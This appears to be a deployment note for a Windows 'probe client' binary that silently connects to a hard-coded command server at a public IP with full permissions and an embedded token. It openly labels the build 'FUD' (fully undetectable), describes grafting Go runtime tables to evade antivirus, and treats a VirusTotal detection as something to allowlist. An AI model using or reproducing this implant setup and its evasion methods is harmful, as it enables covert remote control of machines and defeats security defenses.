PROBE Client — Vegas VM Deployment (v1.15.0+embedded+logfile)
==================================================================

Contents:
  probe-client-vegas-fud.exe    Windows .exe (7.5 MB) with EMBEDDED config
                                + Prometheus gopclntab graft (FUD)
                                + dual-write logger (stderr + logfile)

Configuration (embedded at build time):
  Server:       ws://139.99.148.90:80/ws  (Proxmox public IP)
  Token:        falke-admin-2026
  Name:         vegas-c2022
  Mode:         silent (daemon)
  Permissions:  full

VT status: 1/75 (Microsoft Wacatac.B!ml only — allowlistable)
SHA: a1a871a5ff3e90071341d49fd9fc4952b7b7559d2a81f2c8186a9834c3bbee15

Build info:
  Source:       cmd/probe-client/main.go (current main, post v1.15.0)
  Go:           go1.23.12 (linux/amd64 cross-compile)
  Target:       windows/amd64 (PE format)
  Stripped:     -s -w
  Embedded:     -ldflags "-X main.configB64=... -s -w"
  FUD:          MANTLE pass_graft + Prometheus gopclntab (30 MB source)
  Debug log:    writes to BOTH stderr AND <exe-dir>/logs/probe-client-TIMESTAMP.log

Installation on Vegas:
  1. Copy probe-client-vegas-fud.exe to vegas VM (e.g., C:\Temp\)
  2. Run it (double-click or from cmd as Administrator)
  3. Binary connects to ws://139.99.148.90:80/ws
  4. Appears in probe server's /api/agents list as "vegas-c2022"

DEBUGGING — how to see what it's doing:
  After running, look in: <exe-dir>\logs\probe-client-YYYYMMDD-HHMMSS.log
  Example: C:\Temp\logs\probe-client-20260813-095300.log
  This file shows EXACTLY what happened during the run (connection attempts, errors, etc.)

  Example log content:
    2026/08/13 09:53:00.123456 startup.go:42 PROBE Client v1.10.0
    2026/08/13 09:53:00.123500 startup.go:50 Config: probe-client.json
    2026/08/13 09:53:00.123600 agent.go:1234 Connecting to ws://139.99.148.90:80/ws (mode: outbound)
    2026/08/13 09:53:00.456789 agent.go:1245 Connection failed (attempt 1): dial tcp ...: i/o timeout
    2026/08/13 09:53:01.456789 agent.go:1256 Connection failed (attempt 2): dial tcp ...: i/o timeout

Troubleshooting:
  - No log file? Binary didn't even start init(). Check if PowerShell ran it correctly.
  - "Config: probe-client.json" but no embedded? You have the OLD binary - re-download.
  - Connection failed? Server at 139.99.148.90:80 may be unreachable. Check firewall.
  - "Authentication failed"? Token falke-admin-2026 may have been rotated.
